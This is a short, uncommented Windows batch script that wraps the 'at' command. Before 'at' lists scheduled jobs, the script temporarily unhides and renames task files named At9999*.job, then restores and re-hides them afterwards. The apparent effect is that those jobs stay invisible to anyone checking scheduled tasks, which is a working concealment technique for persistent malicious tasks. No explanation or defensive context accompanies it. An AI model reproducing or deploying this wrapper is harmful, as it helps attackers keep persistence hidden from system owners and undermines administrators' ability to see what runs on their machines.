@echo off
attrib.exe "%SystemRoot%\Tasks\At9999*.job" -s -h 1>nul 2>&1
ren "%SystemRoot%\Tasks\At9999*.job" At9999*.boj 1>nul 2>&1
at.exe %1 %2 %3 %4 %5 %6 %7 %8 %9 2>&1
ren "%SystemRoot%\Tasks\At9999*.boj" At9999*.job 1>nul 2>&1
attrib.exe "%SystemRoot%\Tasks\At9999*.job" +s +h 1>nul 2>&1